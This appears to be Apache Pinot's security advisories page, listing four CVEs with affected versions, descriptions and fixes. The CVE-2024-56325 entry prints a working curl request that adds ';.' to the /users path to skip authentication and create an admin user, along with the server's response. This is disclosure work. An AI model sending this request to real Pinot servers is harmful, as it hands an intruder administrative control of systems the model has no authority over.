---
title: Apache Pinot security advisories
description: Security information for Apache Pinot
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache Pinot? Send your report to the [Apache Security Team](mailto:security@apache.org).

# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## Authentication bypass issue. If the path does not contain / and contain . authentication is not required ## { #CVE-2024-56325 }

CVE-2024-56325 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-56325) [\[CVE json\]](./CVE-2024-56325.cve.json) [\[OSV json\]](./CVE-2024-56325.osv.json)



_Last updated: 2025-10-27T17:11:36.725Z_

### Affected

* Apache Pinot before 1.3


### Description

<b>Authentication Bypass Issue</b><br><br><span style="background-color: rgba(29, 28, 29, 0.04);">If the path does not contain / and contain., authentication is not required.<br><br><b>Expected Normal Request and Response Example</b><br><br><span style="background-color: rgba(29, 28, 29, 0.04);">curl -X POST -H "Content-Type: application/json" -d {\"username\":\"hack2\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"} <a target="_blank" rel="nofollow" href="http://{server_ip}:9000/users">http://{server_ip}:9000/users</a><br><br>
Return: {"code":401,"error":"HTTP 401 Unauthorized"}</span><br><br><br><b>Malicious Request and Response Example</b> <br><br>curl -X POST -H "Content-Type: application/json" -d '{\"username\":\"hack\",\"password\":\"hack\",\"component\":\"CONTROLLER\",\"role\":\"ADMIN\",\"tables\":[],\"permissions\":[],\"usernameWithComponent\":\"hack_CONTROLLER\"}'<b> </b><a target="_blank" rel="nofollow" href="http://{serverip}:9000/users;"><b>http://{serverip}:9000/users;</b></a><b>.</b><br><br>
Return: {"users":{}}
<br><br>
 

A new user gets added bypassing authentication, enabling the user to control Pinot.</span><br><br>

### References
* https://lists.apache.org/thread/ksf8qsndr1h66otkbjz2wrzsbw992r8v


## Unauthorized endpoint exposed sensitive information ## { #CVE-2024-39676 }

CVE-2024-39676 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-39676) [\[CVE json\]](./CVE-2024-39676.cve.json) [\[OSV json\]](./CVE-2024-39676.osv.json)



_Last updated: 2024-07-24T07:41:07.886Z_

### Affected

* Apache Pinot from 0.1 before 1.0.0


### Description

<p>Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Pinot.</p><p>This issue affects Apache Pinot: from 0.1 before 1.0.0.</p><p>Users are recommended to upgrade to version 1.0.0<span style="background-color: rgb(255, 255, 255);">&nbsp;and configure RBAC</span>, which fixes the issue.</p><p><span style="background-color: rgb(255, 255, 255);">Details:&nbsp;</span></p><p><span style="background-color: rgb(255, 255, 255);">When using a request to path “/appconfigs” to the controller, it can lead to the disclosure of sensitive information such as system information (e.g. arch, os version), environment information (e.g. maxHeapSize) and Pinot configurations (e.g. zookeeper path). This issue was addressed by the </span><a target="_blank" rel="nofollow" href="https://docs.pinot.apache.org/operators/tutorials/authentication/basic-auth-access-control"><span style="background-color: rgb(255, 255, 255);">Role-based Access Control</span></a>,<span style="background-color: rgb(255, 255, 255);"> so that /appConfigs` and all other APIs can be access controlled. Only authorized users have access to it. Note the user needs to add the admin role accordingly to the RBAC guide to control access to this endpoint, and in the future version of Pinot, a default admin role is planned to be added.</span></p><br>

### References
* https://lists.apache.org/thread/hsm0b2w8qr0sqy4rj1mfnnw286tslpzc


### Credits
* Xun Bai <bbbbear68@gmail.com> (finder)


## Pinot query endpoint and the realtime ingestion layer has a vulnerability in unprotected environments due to a groovy function support ## { #CVE-2022-26112 }

CVE-2022-26112 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-26112) [\[CVE json\]](./CVE-2022-26112.cve.json) [\[OSV json\]](./CVE-2022-26112.osv.json)



_Last updated: 2022-09-23T03:13:43.429Z_

### Affected

* Apache Pinot from Apache Pinot through 0.10.0


### Description

In 0.10.0 or older versions of Apache Pinot, Pinot query endpoint and realtime ingestion layer has a vulnerability in unprotected environments due to a groovy function support. In order to avoid this, we disabled the groovy function support by default from Pinot release 0.11.0. See https://docs.pinot.apache.org/basics/releases/0.11.0

### References
* https://lists.apache.org/thread/4pb0r12s2b68d78llk04yd8rh3qk5t9h


### Credits
* Apache Pinot would like to thank Haoruo Chen(chenhaoruo0128@gmail.com) for reporting the issue


## Pinot segment push endpoint has a vulnerability in unprotected environments ## { #CVE-2022-23974 }

CVE-2022-23974 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-23974) [\[CVE json\]](./CVE-2022-23974.cve.json) [\[OSV json\]](./CVE-2022-23974.osv.json)



_Last updated: 2022-04-05T19:51:49.065Z_

### Affected

* Apache Pinot from Apache Pinot through 0.9.3


### Description

In 0.9.3 or older versions of Apache Pinot segment upload path allowed segment directories to be imported into pinot tables. In pinot installations that allow open access to the controller a specially crafted request can potentially be exploited to cause disruption in pinot service.

Pinot release 0.10.0 fixes this. See https://docs.pinot.apache.org/basics/releases/0.10.0

### References
* https://lists.apache.org/thread/3dk8pf1n02p8oj2j3czbtchyjsf8khwr


### Credits
* Apache Pinot would like to thank bubblegumkk@qq.com, Kuiplatain@knownsec and FA1C0N@RPO_OFFICIAL for reporting the issue
